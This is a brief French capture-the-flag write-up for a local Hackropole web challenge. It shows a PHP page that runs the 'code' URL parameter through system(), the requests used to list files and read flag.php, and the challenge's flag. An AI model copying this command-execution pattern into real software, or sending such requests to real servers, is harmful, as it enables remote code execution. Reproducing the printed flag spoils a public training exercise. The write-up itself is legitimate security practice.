# Write-up :hackropole_babel_web

## Contexte

Premier challenges de teste de dlnlab

## Reconnaissance

je vois un href de redirection je le tente et je voit un payload intégrer dedans.

## Exploitation

J'utilise le Payload php implémenter dans la boxes source affiche le Payload code permet d'executer des commande du coup j'ai fais: 
http://127.0.0.1:8000/?code=ls
je vois qu'il y as deux fichier: 
flag.php
index.php
donc la deuxieme commande et logique: 
http://127.0.0.1:8000/?code=cat flag.php
.
<?php
    if (isset($_GET['source'])) {
        @show_source(__FILE__);
    }  else if(isset($_GET['code'])) {
        print("<pre>");
        @system($_GET['code']);
        print("<pre>");
    } else {
?>

## Flag

FCSC{5d969396bb5592634b31d4f0846d945e4befbb8c470b055ef35c0ac090b9b8b7}

## Ce que j'ai appris

Rien de fou, principe d'un pentest reco - exploit - flag.